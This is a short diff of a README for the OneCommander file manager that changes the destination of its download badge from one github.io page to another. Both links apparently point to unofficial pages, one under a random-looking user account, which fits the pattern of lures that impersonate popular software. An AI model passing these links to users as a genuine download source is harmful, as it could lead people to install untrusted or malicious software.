@@ -1,6 +1,6 @@
 # OneCommander File Manager - Modern File Manager for Windows Productivity
 
-[![GET OneCommander](https://img.shields.io/badge/GET%20%E2%80%94%20OneCommander-0078D6?style=for-the-badge&logoColor=white)](https://matteobrookssajz.github.io/.github/OneCommander-for-Windows)
+[![GET OneCommander](https://img.shields.io/badge/GET%20%E2%80%94%20OneCommander-0078D6?style=for-the-badge&logoColor=white)](https://onecommander-filemanager.github.io/.github/)
 
 ## What OneCommander Brings to File Work
 
